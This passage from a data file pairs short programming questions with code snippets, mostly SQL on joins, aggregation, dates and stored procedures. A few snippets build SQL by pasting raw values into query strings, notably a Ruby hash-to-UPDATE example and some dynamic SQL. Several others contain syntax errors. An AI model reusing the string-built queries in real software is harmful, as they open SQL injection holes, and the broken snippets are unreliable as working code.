INSERT INTO OtherTable ([UserId]) Values (@NewID)
"
9541,7966,Teradata stored procedure with dynamic parameters called from R script,"CREATE PROCEDURE procTest4 (IntN INTEGER)
DYNAMIC RESULT SETS 1
BEGIN
   DECLARE SqlStr VARCHAR(1000);
   DECLARE rslt CURSOR WITH RETURN ONLY FOR stmt;
   SET SQLStr = 'SELECT top ' || IntN || ' * from TableName';
   PREPARE stmt FROM SqlStr;
   OPEN rslt;
END;
"
14143,64566,View Image in One activity using SqlLite Database,"public class MainActivity extends Activity {

int imgNumber = 1;
...

ImageView imgView = (ImageView)findViewById(R.id.imageview);

imgView.setImageResource(R.drawable.image1);

...

next.setOnClickListener(new OnClickListener() {


        @Override
        public void onClick(View v) {

        if (imgNumber==0) {
          imgView.setImageResource(R.drawable.image1);
          imgNumber++;
        } else if(imgNumber==1) {
          imgView.setImageResource(R.drawable.image2);
          imgNumber++;
        } else if(imgNumber==2) {
          imgView.setImageResource(R.drawable.image3);
          imgNumber++;
        } else if(imgNumber==3) {
          imgView.setImageResource(R.drawable.image4);
          imgNumber++;
        } else if(imgNumber==4) {
          imgView.setImageResource(R.drawable.image5);
          imgNumber = 0;
        }

        }
});
...
}
"
11789,35924,Oracle if statement in where clause,"Where ...
  AND 
    (
        (TO_CHAR(:DATEINPUT, 'DAY') = 'SATURDAY' AND TO_CHAR(Q.DATE_INSERTED, 'DD') = TO_CHAR(:DATEINPUT-1, 'DD'))
        OR 
        (TO_CHAR(:DATEINPUT, 'DAY') = 'SUNDAY' AND TO_CHAR(Q.DATE_INSERTED, 'DD') = TO_CHAR(:DATEINPUT-2, 'DD'))
    )
    AND ...
"
17630,241,How do I filter a history table for items that had a specific status but exclude that item if it also had another specific status,";With RecentStatuses As 
(
    Select  FK_JobId, MaterStatus, Max(Updated) Recent
    From    @History
    Group by FK_JobID, MaterStatus
)
Select  H1.FK_JobID
From    RecentStatuses  H1
Where   H1.MaterStatus = 'Issued'
And Not Exists
(
    Select  *
    From    RecentStatuses  H2
    Where   H2.FK_JobID = H1.FK_JobID
    And     H2.MaterStatus = 'Revoked'
    And     H2.Recent >= H1.Recent
)
"
8352,31352,Can I lock rows in a cursor if the cursor only returns a single count(*) row?,"alter table dept add (manager_count integer default 0 not null,
   constraint manager_count_chk check (manager_count <= 3));

create trigger emp_trg
before insert or update or delete on emp
for each row
begin
    if inserting or updating then
        if :new.job = 'MANAGER' then
            update dept
            set    manager_count = manager_count+1
            where  deptno = :new.deptno;
        end if;
    end if;
    if updating or deleting then
        if :old.job = 'MANAGER' then
            update dept
            set    manager_count = manager_count-1
            where  deptno = :new.deptno;
        end if;
    end if;
end;
"
5746,45180,Aggregating based on buckets sql,"select ltvBucket, CrateBucket,
       avg(SavRate), avg(SavIncentive), sum(PartialPrepay)
from (select t.*,
             (case when ltv between 0.0 and 0.2 then 'LTV:0.0-0.2'
                   when ltv between 0.2 and 0.4 then 'LTV:0.2-0.4'
                   when ltv between 0.4 and 0.6 then 'LTV:0.4-0.6'
                   when ltv between 0.6 and 0.8 then 'LTV:0.6-0.8'
                   else 'LTV:other'
             end) as ltvbucket,
            (case when Crate between 2 and 4 then 'Crate:2-4'
                  when Crate between 4 and 6 then 'Crate:4-6'
                  when Crate between 6 and 8 then 'Crate:6-8'
                  else 'Crate:Other'
            end) as CrateBucket
      from t
     ) t
group by ltvBucket, CrateBucket
"
739,36731,MySQL to group a column's values to a single cell value,"select column1, column2, column3, column4, column5, group_concat(column6) as column6
from query q
group by column1, column2, column3, column4, column5;
"
37534,31758,replacing field in Oracle SQL with join not working,"SELECT   
  client.title AS TITLE, 
  COUNT(SUBSTR(activity, INSTR(activity, '/', 1, 4) + 1, INSTR(activity, '/', 1, 5) - INSTR(activity, '/', 1, 4)-1)) AS DOWNLOADS 
FROM
  access_log
  JOIN client
    ON client.id = access_log.id
WHERE
  client.id = 5555
  AND time_stamp BETWEEN TO_DATE ('2014/05/01', 'yyyy/mm/dd') AND TO_DATE ('2014/10/31', 'yyyy/mm/dd') 
GROUP BY SUBSTR(activity, INSTR(activity, '/', 1, 4) + 1, INSTR(activity, '/', 1, 5) - INSTR(activity, '/', 1, 4) -1) 
ORDER BY DOWNLOADS DESC;
"
20303,14351,sql update procedure,"if (exVal is null) then tempExclude := 'Y' else tempExclude := NULL;
Update mbddx_animal
set exclude = tempExclude where...
"
27706,22781,sql tricky query with distinct,"SQL Statement
SELECT  a.rec_type
        , COUNT(*) as count_distinct
        , a.time_key as hour
FROM    (        
          SELECT a.rec_type
                  , a.a_tel_id
                  , a.time_key
          FROM    v_f_Logicacdrs21 a        
          GROUP BY
                  a.rec_type
                  , a.a_tel_id
                  , a.time_key
        ) a                  
GROUP BY
        a.rec_type
        , a.time_key
"
6672,55884,Check if table exists in the database - PL SQL,"select tname from tab where tname = 'TABLE_NAME_TO_SEARCH_FOR';
"
30069,67891,SQL Favorite Color Quiz,"select y.COLOR, count(*) as COUNT
from (select USER, min(ORDER) as ORDER from TheTable group by USER) x
inner join TheTable y on x.USER = y.USER and x.ORDER = y.ORDER
group by COLOR
"
21204,21475,SQL table function or means to tell if identity column has been used?,"SELECT IDENT_SEED(TABLE_NAME) AS Seed,
    IDENT_INCR(TABLE_NAME) AS Increment,
    IDENT_CURRENT(TABLE_NAME) AS Current_Identity,
    TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE OBJECTPROPERTY(OBJECT_ID(TABLE_NAME), 'TableHasIdentity') = 1
    AND TABLE_TYPE = 'BASE TABLE'
"
9579,64055,SQL : Return column value based on previous few rows values,"SELECT 
    [NAME]
  , [TIME]
  , (SELECT MAX(IsTrue+0) FROM TABLE1 it WHERE DATEADD(DD,1,it.TIME) > ot.TIME AND it.TIME <= ot.Time) [ISTRUE]
FROM Table1 ot
"
37287,28628,SQL - Counts not returning zeros,"SELECT mem.member_id, mem.screen_name, mem.firstname, mem.lastname, mem.country_code,  
mem.joined, rep.rep as reputation, IFNULL(com.cnt,0) as comments FROM members AS mem 
LEFT OUTER JOIN ( 
    SELECT member_id, SUM(awarded_what) as rep 
    FROM members_reputation 
    GROUP BY member_id) rep 
    ON mem.member_id = rep.member_id 
LEFT OUTER JOIN ( 
    SELECT member_id, COUNT(comment_id) as cnt 
    FROM blog_comments 
    GROUP BY comment_id) com 
    ON mem.member_id = com.member_id 
GROUP BY mem.member_id 
ORDER BY mem.joined DESC 
"
33791,52217,Multiple conditions on select query,"SELECT pr.Volume_UOM
 ,pr.Length_mm*pr.Width_mm*pr.Height_mm AS Volume_Cubic
 ,pr.Length_mm*pr.Width_mm AS Volume_Floor
 ,pr.Length_mm
 ,pr.Height_mm
 ,pr.Width_mm
FROM CostToServe_MCB.staging.Sale sa
LEFT JOIN staging.Product pr
ON sa.ID = pr.ID
and pr.Length_mm is not null
and pr.Width_mm is not null
and pr.Height_mm is not null
"
2955,44930,Find all stored procedures with particular starting name,"SELECT o.name
FROM sysobjects AS o
INNER JOIN sysprocedures AS p ON o.id = p.id
WHERE o.name LIKE ""ABC%""
"
23140,7937,oracle table is not locked,"LOCK TABLE countries 
    IN EXCLUSIVE MODE 
    NOWAIT;
"
28952,49325,Copy data between two columns using where with SQL,"UPDATE table SET two = one WHERE LENGTH(one) = 2
"
1221,39537,MySQL Selecting from multiple rows,"SELECT
    p.*,
    j.company_id as companyid,        
    f.id IS NOT NULL AS jid,
    p.id as pid,
    f.id AS fave_id,
    f.id IS NOT NULL AS fave
FROM people p  
LEFT JOIN job j 
       ON j.id = p.job_id
LEFT JOIN favourites f 
       ON f.people_id=p.id
      AND f.user_id = 12
WHERE p.company_id = 3
ORDER BY p.id ASC
"
29980,56672,vb.net sql last inserted ID,"sql = ""INSERT INTO...;SELECT @@IDENTITY..."" 
Dim id = sqlCommand.ExecuteScalar(sql)
"
35743,11274,SUM data only when COUNT(*) > 0,"SELECT pr.[name], 
       SUM(COALESCE(qm.iscompleted,0)) AS count_yes,
       (case when COUNT(p.id) > 0 then 
             SUM(COALESCE(qm.iscompleted,1))
        else
             0 end) AS count_no,
       COUNT(p.id) AS tot
"
17404,44706,Is there any performance or functional difference between these two SQL statements?,"SELECT      
Location.ID, 
Location.Location, 
COUNT(Person.ID) As CountAdultMales
FROM        
Transactions 
INNER JOIN Location 
ON Transactions.FKLocationID = Location.ID 
INNER JOIN Person 
ON Transactions.FKPersonID = Person.ID 
WHERE
Transactions.Deleted = 0 AND
Person.Deleted = 0 AND
Location.Deleted = 0 AND 
Person.DateOfBirth < dateadd(year, datediff(year, 0, getdate())-17, 0) AND 
Person.Gender = 1
"
6040,25852,"how to ""re-validate"" a foreign constraint in oracle","ALTER TABLE issues ENABLE VALIDATE CONSTRAINT fk_client;
"
37311,38994,PL/SQL Array to CLOB,"declare 
 v_clob clob;
 v_xml xmltype;
begin
 select xmlagg(XMLELEMENT(""test"",xmlforest(id,val)))
 into v_xml
 from test;
 select v_xml.getclobval
 into v_clob
 from dual;
 dbms_output.put_line(v_clob);
end;
/
"
34385,57815,Recursive SQL and information on different level,"select connect_by_root cab
      , level, cab, niveau, entite, entite_parent, libelle
   from my_table
  where niveau = 2
  start with cab = 'XXX'
connect by prior entite_parent = entite
"
35628,11447,Get result from multiple tables in single SQL query,"SELECT AP.TERMNAME
    ,COUNT(DISTINCT AP.TERMID) AS tot
    ,COUNT(DISTINCT AI.CTYPE) AS event
    ,COUNT(DISTINCT CASE WHEN AI.CTYPE = 'event' THEN AI.CTYPE ELSE NULL END) AS page
FROM REPORT_API_USAGE AP
INNER JOIN REPORT_API_PAGES AI ON AP.TERMID = AI.TERMID
WHERE AI.CTYPE IN ( 'download', 'event' )
    AND AP.VOCID = '21'
GROUP BY AP.TERMNAME
"
34645,61299,sql - joining 3 tables on same column,"SELECT blogs.user_id,
       blogs.blog_id,
       blogs.blog_content, 
       users.user_id,
       users.name, 
       comments.comment_id,
       comments.blog_id,
       comments.user_id,
       comments.comment_content ,
       comment_writers.name as CommentUserName
FROM blogs 
LEFT JOIN users ON users.user_id = blogs.user_id 
LEFT JOIN comments ON comments.blog_id = blogs.blog_id
LEFT JOIN users AS comment_writers ON comment_writers.user_id = comments.user_id
WHERE blogs.blog_id = 2
"
16046,15589,query the two table for draw in one,"SELECT table1.email as Email, 
    table2.accesses as Acesses, 
    table1.attempts as Attempts
from table1 
INNER JOIN table2 
on table1.email = table2.email
"
29008,29941,select datetime without specifying the time part?,"SELECT * FROM stat_tps WHERE DATE(min_date) ='2013-06-12'
"
4965,39721,sql sum rows and put into columns of select," select
      person,
      sum(case activitycode when 1 then activityvalue else 0 end),
      sum(case activitycode when 2 then activityvalue else 0 end),
      ....
 from 
      yourtable
 group by
      person
"
12707,128,Flagging consecutive days in SQL,"select patient_id,
       max(case when date_trunc('day', date_noted) = date_trunc('day', prev_date_noted)
                then 1 else 0
           end) as IsConsecutiveFlag
from (select patient_id, date_noted,
             lag(date_noted) over (partition by patient_id order by date_noted) as prev_date_noted
      from t
     ) t
group by patient_id;
"
4143,41235,PostgreSQL ascending maxes by date,"SELECT t1.value
       ,t1.date
FROM Table1 AS t1
  LEFT JOIN Table1 AS t2
    ON t1.date > t2.date
GROUP BY 
  t1.id
HAVING
  max(t2.value) IS NULL 
  OR max(t2.value) < t1.value
ORDER BY t1.date;
"
33836,3332,Android Content Provider how to query with multiple selectionArg,"String selection1 = DatabaseOpenHelper.COLUMN_ID + "" in ("";
for (int i = 0; i < selectionArgs1.length; i++) {
    selection1 += ""?, "";}           
selection1 = selection1.substring(0, selection1.length() - 2) + "")"";            
getContentResolver().query(StudentContentProvider.CONTENT_URI1, projection1, selection1, selectionArgs1, null);
"
30419,8268,How can you query a SQL database for malicious or suspicious data?,"SELECT *
FROM MyTable
WHERE MyField LIKE '%[^a-z0-9]%'
"
7388,75076,Is there any way to speed up this query?,"SELECT mlscopy.listing_listnum 
FROM mlscopy A
NOT EXISTS
(
    SELECT *
    FROM mls_cvrmls B
    WHERE B.listing_listnum = A.listing_listnum
);
"
31955,74667,SQL select dates in future and not ending before until date,"SELECT * FROM shows s 
WHERE s.show_status = 'ENABLED'
AND 
(
  s.show_from >= CURRENT_DATE() 
  OR (s.show_from <= CURRENT_DATE() AND s.show_until >= CURRENT_DATE())
)
ORDER BY s.show_from ASC
"
30593,59919,GroupBy and SelectMany analogues in SQL?,"SELECT * 
FROM mytable
CROSS APPLY (
  SELECT * 
  FROM othertable
  WHERE instance_id = mytable.instance_id)
"
32309,27412,SQL: Concat a column with a limit?,"select city,
  state,
  substring_index(group_concat(stores SEPARATOR ', '), ', ', 2) stores
from yt                                                   -- ^ number of values to limit
group by city, state;
"
11301,18490,Heroku - SQL query return difference results on localhost and heroku,"db=# select current_date - interval '15' year;
      ?column?       
---------------------
 1997-04-26 00:00:00

db=# select current_date - interval '15'
        years        
---------------------
 2012-04-25 23:59:45

db=# select current_date - interval '15 year';
      ?column?       
---------------------
 1997-04-26 00:00:00
"
28521,11789,SQL: how to select single record for multiple id's on the basis of max datetime?,"SELECT        a.Id, a.WindSpeed, a.DateTime
FROM          YourTable AS a
INNER JOIN     
(
    SELECT    ID, Max(DateTime) AS DateTime
    FROM      YourTable
    GROUP BY  ID
) AS b
ON            a.ID = b.ID
AND           a.DateTime = b.DateTime
"
28863,50017,Joining Multiple Large Tables,"select t1.a, t1.b
into t4
from t1
join t2 on t1.a = t2.a and t1.c = t2.c
join t3 on t1.a = t3.a and t1.c = t3.c
where t3.e / t2.d < x
"
37341,73186,How many chars are available in nvarchar(MAX),"declare @string nvarchar(MAX) = ''
select datalength(@string), LEN(@string)
GO

declare @string nvarchar(MAX) = '1'
select datalength(@string), LEN(@string)
"
14880,15371,How to search a column name within all tables of a database,"select table_name, column_name
from user_tab_columns
where column_name like '%AUTHOR%';
"
5166,35763,How to: Find and update all the entries where the value in one column shows up more than once,"UPDATE tbl a
INNER JOIN
    (
        SELECT subid
        FROM tbl
        GROUP BY subid
        HAVING COUNT(*) > 1 AND SUM(author_id = 111) > 0
    ) b ON a.subid = b.subid
SET a.ordering = (a.author_id = 111)
"
5457,16530,using while loop not looping through date properly,"declare @currentDate datetime,@enddate datetime

set @currentDate = '20150601'
set @enddate='20150605'

while (@currentDate <= @enddate) begin
  select @currentDate as currentdate
  select @currentDate = dateadd(DAY,1,@currentDate)
end
"
14255,51104,Extract data from multiple tables,"declare @TableA as table (inv int, amount int, disc int)
declare @TableB as table (inv int, description varchar(50), amount int)

insert into @TableA values (1001, 1500, 105)
insert into @TableA values (1002, 3000, 300)

insert into @TableB values (1001, 'CHARGES', 100)
insert into @TableB values (1001, 'FREIGHT', 30)
insert into @TableB values (1001, 'INSURANCE', 20)
insert into @TableB values (1002, 'CHARGES', 215)
insert into @TableB values (1002, 'FREIGHT', 32)
insert into @TableB values (1002, 'INSURANCE', 25)

select
    A.inv,
    A.amount,
    A.disc,
    B.charges,
    B.freight,
    B.insurance
from @TableA as A
    inner join (
                SELECT t.inv,
                       MAX(CASE WHEN t.description = 'CHARGES' THEN t.amount ELSE NULL END) AS charges,
                       MAX(CASE WHEN t.description = 'FREIGHT' THEN t.amount ELSE NULL END) AS freight,
                       MAX(CASE WHEN t.description = 'INSURANCE' THEN t.amount ELSE NULL END) AS insurance
                FROM @TableB as t
                GROUP BY t.inv) as B
        on A.inv = B.inv
where
    B.charges = 100 and
    A.inv = 1001
"
29689,30193,MYSQL (NOT IN) query is very slow,"ALTER TABLE `table2` ADD INDEX (`name`)
"
18852,36286,SQL Match employee intime (punch time) with employee shift,"select ads.attendancesumid,
       ads.employeeid,
       ads.date,
       ads.day,
       ads.intime,
       ads.outtime,
       ss.intime,
       ss.outtime
  from employee_attendance_daily_summary ads
  join employee emp
    on emp.employeeid = ads.employeeid
  join setup_shift ss
    on ss.shiftcode = emp.shiftcode
   and datepart(dw, ads.date) = ss.day
 where ads.employeeid = 4
   and ((abs(datediff(hh,
                      cast(ads.intime as datetime),
                      cast(ss.intime as datetime))) between 0 and 2) or
       (ads.intime = '00:00:00' and
       ss.intime =
       (select min(x.intime)
            from setup_shift x
           where x.shiftcode = ss.shiftcode
             and x.intime > (select min(y.intime)
                               from setup_shift y
                              where y.shiftcode = x.shiftcode))))
"
33965,61305,MySql JOIN on most recent start_date?,"SELECT t.event_date, t.amount, p.percent
FROM bedic_sixsummits_transactions AS t
LEFT JOIN bedic_sixsummits_percent AS p
ON p.effective = 
   ( SELECT MAX( p2.effective ) FROM bedic_sixsummits_percent AS p2
     WHERE p2.effective <= t.event_date
   )
ORDER BY t.event_date DESC LIMIT 0 , 30
"
20782,16980,Combine two different unrelated SQL queries( returning single column results) into one query result with two columns,"SELECT
   (
      select SUM(MarksObtained)  
      from tbAnswers where QID IN (
          Select QID from tbQuestions where ExamID = 2
      )
   ) as MarksObtained,
   (
       Select SUM(Marks)   
       from tbQuestions where ExamID = 2
   ) as MaxMarks
"
25381,55203,Oracle Insert with mutli-valued column,"insert into onTeam(date, player, teamName) 
select 'newDate','Matt Holliday', teamName 
from onTeam where player = 'Matt Holliday'
"
13833,51007,sql join two tables with 0 values,"select coalesce(a.id, b.id) as id,
       coalesce(a.income, 0) as income,
       coalesce(b.outcome, 0) as outcome,
       (coalesce(a.income, 0) - coalesce(b.outcome, 0)) as balance
from tablea a full outer join
     tableb b
     on a.id = b.id;
"
3913,73187,Null Processing in MS SQL Server 2008,"COALESCE(MiddleInitial,'') AS MiddleInitial   
"
25909,63930,Import list into SQL,"LOAD DATA LOCAL INFILE '/path/myfile.txt' INTO TABLE mytable;
"
17300,51682,Duplicate records with postgres,"SELECT s.stop_name, min(st.departure_time) departure_time
  FROM stops s
    INNER JOIN stop_times st
      ON s.stop_id = st.stop_id
    INNER JOIN (
      SELECT DISTINCT t.trip_id, t.route_id
        FROM trips t, northbound nb
        WHERE t.trip_id LIKE CONCAT(nb.train_id,'%')
        AND t.route_id = '2'
    ) TR
      ON TR.trip_id = st.trip_id
WHERE st.departure_time > 1373948273
GROUP BY s.stop_name 
"
37802,40094,Construct SQL statement from Ruby Hash,"h = {:country => ""Thailand"", :postal_code => ""10110""}
""UPDATE table SET #{h.map { |k, v| ""#{k} = '#{v}'"" }.join(', ')} WHERE id = 1;""
# ""UPDATE table SET country = 'Thailand', postal_code = '10110' WHERE id = 1;""
"
18906,20452,How to insert one column into other column within the same table in SQL Server,"UPDATE table
SET col_2 = col_1
"
39349,41216,Get monthly reports on SQl even if null,"   select
        month(date_reception),
        count(mc_object)
    from
        [full]
    where
        date_reception > '2015-01-01'
        and date_reception < '2015-06-26'
        and (mc_object LIKE '%obj1%' OR mc_object is null) 
    group by
        (month(date_reception))
"
23598,35681,T-SQL. Still need an identity value from SuperType table although there are no values to insert,"CREATE TABLE dbo.SuperType (SuperTypeId INT NOT NULL IDENTITY PRIMARY KEY);

INSERT INTO dbo.SuperType DEFAULT VALUES;

SELECT SCOPE_IDENTITY();
"
27900,54671,SQL query to get top 10 of a new column generated by SUM,"ORDER BY Total DESC
LIMIT 10
"
18550,24787,How can I declare a Boolean parameter in SQL statement?,"DECLARE @MyVar bit
Set @MyVar = 1  /* True */
Set @MyVar = 0  /* False */

SELECT * FROM [MyTable] WHERE MyBitColumn = @MyVar
"
18780,48063,How to fill a varchar with a number of occurences of a pattern,"SELECT id,
    CONCAT(amounts, REPEAT('|', 5 - GroupCount)) AS amounts,
    CONCAT(issueDates, REPEAT('|', 5 - GroupCount)) AS issueDates,
    CONCAT(bonusAmounts, REPEAT('|', 5 - GroupCount)) AS bonusAmounts
FROM
(
    SELECT
        p.id,  
        GROUP_CONCAT(t1.amount SEPARATOR ""|"") as amounts,  
        GROUP_CONCAT(t1.issueDate SEPARATOR ""|"") as issueDates,   
        GROUP_CONCAT(t2.amountInEuro*100/t1.amountInEuro SEPARATOR ""|"") as bonusAmounts,
        COUNT(*) AS GroupCount 
    FROM Transaction t1 
    JOIN Player p 
    ON p.id = t1.player_id 
    INNER JOIN (SELECT player_id, COUNT(*) FROM Transaction WHERE issueDate BETWEEN '2010-07-03 00:00:00' AND '2013-07-03 23:59:59' GROUP BY player_id) tr
    ON tr.player_id = t1.player_id
    LEFT OUTER JOIN Transaction t2
    ON t2.id = t1.deposit_id AND type = 3
    WHERE t1.type = 0 
    and t1.status = 0 
    GROUP BY t1.player_id 
    HAVING GroupCount <= 5
) Sub1
"
11779,30506,Finding Median of Dates in SQL Server 2008,"WITH
    tmp AS
    (
        SELECT invoice_no,
                dates,
                cast(count(*) OVER (PARTITION BY invoice_no) as float) AS total,
                row_number() OVER (PARTITION BY invoice_no ORDER BY dates) AS rn
        FROM    INVOICE_HEADER
    )


SELECT *
FROM tmp
WHERE (total / 2.0 - 1) < rn
    and rn < (total / 2.0 + 1)
"
16650,5016,"MYSQL Comment Counting, not working","SELECT p.*, COALESCE(COUNT(c.post_id), 0) AS numberOfComments
FROM posts p 
LEFT JOIN comments c ON c.post_id = p.post_id
WHERE p.number_of_comments = 'B'
GROUP BY p.post_id
LIMIT 0, 30;
"
15334,67457,How to return rows only if there is more than one result,"SELECT *
  FROM (SELECT col1,
               col2,
               COUNT(*) OVER() cnt
          FROM your_table
         WHERE <conditions> )
 WHERE cnt > 1
"
11195,53312,Conditionally Aggregate Rows,"select user_id, min(start_time) as start_time, max(end_time) as end_time
from (select t.*,
             sum(case when start_time > prev_end_time + interval '10' minute
                      then 1 else 0
                 end) over (partition by user_id order by start_time) as grp
      from (select t.*,
                   lag(end_time) over (partition by user_id order by start_time) as prev_end_time
            from t
           ) t
     ) t
group by grp, user_id;
"
15881,53331,Difference between UNIQUE and UNIQUE KEY mySQL,"create_definition:
    col_name column_definition
  | [CONSTRAINT [symbol]] PRIMARY KEY [index_type] (index_col_name,...)
      [index_option] ...
  | {INDEX|KEY} [index_name] [index_type] (index_col_name,...)
      [index_option] ...
  | [CONSTRAINT [symbol]] UNIQUE [INDEX|KEY]
      [index_name] [index_type] (index_col_name,...)
      [index_option] ...
  | {FULLTEXT|SPATIAL} [INDEX|KEY] [index_name] (index_col_name,...)
      [index_option] ...
  | [CONSTRAINT [symbol]] FOREIGN KEY
      [index_name] (index_col_name,...) reference_definition
  | CHECK (expr)
"
9401,9939,"SQL - Find Duplicates, then add to another table with count","INSERT INTO CustomerTotals
(CompanyName, Totals)
SELECT CompanyName, COUNT(*)
FROM Customer
GROUP BY CompanyName
"
11234,28563,Get the biggest number in database column,"SqlConnection sqlConnection1 = new SqlConnection(""Your Connection String"");
SqlCommand cmd = new SqlCommand();
SqlDataReader reader;
cmd.CommandText = ""SELECT (ISNULL(MAX(yourcolumn), 0) + 1) as BigNum FROM yourtable"";
cmd.CommandType = CommandType.Text;
cmd.Connection = sqlConnection1;
sqlConnection1.Open();
reader = cmd.ExecuteReader();
    if (reader.Read())
{
    int bingnum =Convert.ToInt32( reader[""BigNum""]);
}
sqlConnection1.Close();
"
3559,11732,Mysql - getting distinct records,"select ua.* 
from user_actions ua
join (select max(id) as max_id,user_id,action_type from user_action group by user_id,user_action) ua_max
on ua.id=ua_max.max_id and ua.user_id=ua_max.user_id and ua.action_type=ua_max.action_type
"
22641,44342,Merge Oracle groups output into 1 single row as final result,"select 'DB_QUERY1', count(1)
from test_db.new_arch
where name like 'DATA1%' or name like 'DUAL%';
"
23256,22048,Calculating Horizontal Totals in Pivot in MS SQL Server 2008,"SELECT CASE WHEN GROUPING([FCode]) = 1 THEN 'Total' ELSE [FCode] END AS [FCode],
       SUM([DMAR15]) AS DMAR15,
       SUM([DMAR02]) AS [DMAR02]
        /*TODO: Rest of columns*/
FROM   (SELECT [FCode],
               [Aggregate],
               [QName]
        FROM   [tblMiquestResults]) AS SourceTable 
PIVOT (AVG (Aggregate) FOR [QName] IN ([DMAR15], [DMAR02], [DMAR13], 
                                       [DMAR06], [PCVDR41], [PCVDR42], 
                                       [CLDP031], [CLDP003], [CLDP012], 
                                       [CLDP028], [CLDP023], [CLDP021], 
                                       [CLDP016], [CLDP022])) AS P 
GROUP BY GROUPING SETS ((FCode),())
"
32432,56490,"MySQL: Why can't I ""column_name not in (null, 'foo')""?","True
False
Unknown
"
31579,6427,How can I retrieve the logical file name of the database from backup file,"DECLARE @Table TABLE (LogicalName varchar(128),[PhysicalName] varchar(128), [Type] varchar, [FileGroupName] varchar(128), [Size] varchar(128), 
            [MaxSize] varchar(128), [FileId]varchar(128), [CreateLSN]varchar(128), [DropLSN]varchar(128), [UniqueId]varchar(128), [ReadOnlyLSN]varchar(128), [ReadWriteLSN]varchar(128), 
            [BackupSizeInBytes]varchar(128), [SourceBlockSize]varchar(128), [FileGroupId]varchar(128), [LogGroupGUID]varchar(128), [DifferentialBaseLSN]varchar(128), [DifferentialBaseGUID]varchar(128), [IsReadOnly]varchar(128), [IsPresent]varchar(128), [TDEThumbprint]varchar(128)
)
DECLARE @Path varchar(1000)='C:\SomePath\Base.bak'
DECLARE @LogicalNameData varchar(128),@LogicalNameLog varchar(128)
INSERT INTO @table
EXEC('
RESTORE FILELISTONLY 
   FROM DISK=''' +@Path+ '''
   ')

   SET @LogicalNameData=(SELECT LogicalName FROM @Table WHERE Type='D')
   SET @LogicalNameLog=(SELECT LogicalName FROM @Table WHERE Type='L')

SELECT @LogicalNameData,@LogicalNameLog
"
26730,30555,SQL Server - select into from statement?,"declare @sqlQuery = 'select column
from table_(';

set @sqlQuery = @sqlQuery + 'select id from table2)';

EXEC (@sqlQuery)
"
8285,49826,Syncing a mobile (iPhone) app with web app,"A - Adds new entry
B - Adss new entry
A - Get B's entry
B - Get A's entry
A - Update entry
B - Delete A's entry
"
35497,72490,compare two select statements in oracle SQL,"SELECT (whatever operations you gonna do) FROM dual WHERE (select sum(quantity) from Table 1 where order_number = XXXX) = (select sum(quantity) from Table 2 where order_number = XXXX);
"
25061,18366,SQL statement to update one table if value present in another,"UPDATE F4102 
SET    IBBUYR = 1009
WHERE EXISTS (
              SELECT 1
              FROM F4101 
              WHERE IMITM  = F4102.IBITM 
              AND  IMSRTX = 'RESIN'
             )
"
38409,31526,Specified DB name with previous year,"DECLARE @CURRENTYEAR  AS INT = year(getdate())
DECLARE @PREVIOUSYEAR AS INT = @CURRENTYEAR - 1

DECLARE @QUERY_ VARCHAR(2000)
SET @QUERY_ = 
'SELECT
     COL_1
    ,COL_2
    ...
FROM DB' + @CURRENTYEAR + '.DBO.TABLENAME

UNION ALL

SELECT
     COL_1
    ,COL_2
    ...
FROM DB' + @PREVIOUSYEAR + '2015.DBO.TABLENAME'

EXEC(@QUERY_)
"
5432,56587,MySQL \ join 2 tables and show results from 2 rows in one column,"SELECT p.id, GROUP_CONCAT( im.i_name SEPARATOR '; ' ) AS images
FROM products p 
LEFT JOIN images im ON (im.product_id = p.id)
WHERE p.id IN (1, 3) GROUP BY p.id
"
11615,65856,MySQL get latest 3 rows for every id in where in,"SELECT A.*, u.name 
FROM (SELECT c.*, IF(@updateId = @updateId:=update_id, @idx:=@idx+1, @idx:=0) idx 
      FROM comms c, (SELECT @updateId:=0, @idx:=0) A
      WHERE update_id IN ('1451', '1416', '1186', '1157', '1150', '1122', '1057', '914', '850', '816', '794', '790', '749', '746', '745', '744', '740')
      ORDER BY update_id, id DESC   
    ) AS A 
INNER JOIN users AS u ON u.id = A.user_id
WHERE A.idx < 3
"
20707,41940,SQL to JOIN on two different columns,"SELECT c.CONTACT,
   c.ClientID,
   c.CONTACTID
FROM CONTACT as c
INNER JOIN CONTACT_CONTACT as cc on c.CONTACTID = cc.CONTACTID1
INNER JOIN CONTACT as c2 on cc.CONTACTID2 = c2.CONTACTID
WHERE c.ClientID = 121695 
    AND cc.CONTACT1_ROLE = 'Doctor'
union
SELECT c2.CONTACT,
   c2.ClientID,
   c2.CONTACTID
FROM CONTACT as c
INNER JOIN CONTACT_CONTACT as cc on c.CONTACTID = cc.CONTACTID2
INNER JOIN CONTACT as c2 on cc.CONTACTID1 = c2.CONTACTID
WHERE c.ClientID = 121695 
    AND cc.CONTACT2_ROLE = 'Doctor'
"
23471,66217,mysql fill in missing dates for each specific value in column,"SELECT  
    year(c.datefield) as year,
    month(c.datefield) as month,
    s.subchannel,
    count(l.created)
FROM db.calendar c
    CROSS JOIN (select distinct subchannel from l_events) s
    LEFT JOIN db.l_events l
        ON (date(l.created) = c.datefield)
        AND l.subchannel = s.subchannel
Where c.datefield between '2013-10-01' and '2014-03-31' 
group by
    s.subchannel,
    year(c.created), 
    month(.created)
order by
    s.subchannel,
    year(c.created), 
    month(.created)
    ;
"
38061,60194,mysql search events between dates?,"SELECT event_id, event_name
FROM events
WHERE start_date <= 2013-07-30 AND end_date >= 2013-07-16
"
32986,14514,Updating whole table without ID iteration,"UPDATE invoices 
    JOIN connecting 
        ON invoices.id = connecting.id_inv
    JOIN products 
        ON products.id= connecting.id_prod
    SET invoices.to_update= SUM(products.update_from) 
"
25549,63063,T-SQL inner join first result of inner join,"SELECT p.PropertyID, p.Name, pi.PropertyImageID, pi.Source, pi.Type 
  FROM Property p 
       INNER JOIN PropertyImage pi
         ON pi.PropertyImageId = (SELECT MAX(sub.PropertyImageId) 
                                    FROM PropertyImage sub
                                   WHERE sub.PropertyId = p.PropertyId)
"
36336,32687,Intermediate security layer (Django/SQL),"class Country(models.Model):
    name = models.CharField(max_length=64)
    iso_code = models.CharField(max_length=2)
    users = models.ManyToManyField(""auth.User"")

class MyModel(models.Model):
    country = models.ForeignKey(Country)
    ...

MyModel.objects.filter(country__users=current_user)
"
39577,69841,Do conditional INSERT with SQL?,"INSERT INTO targetTable(field1) 
SELECT field1
FROM myTable
WHERE NOT(field1 IN (SELECT field1 FROM targetTable))
"
21519,56074,Query for restricting associated entities,"Criteria crit = session.createCriteria(Kite.class);
crit.add(Restrictions.ge(""length"", new BigDecimal(1.0))
.createCriteria(""boy"")
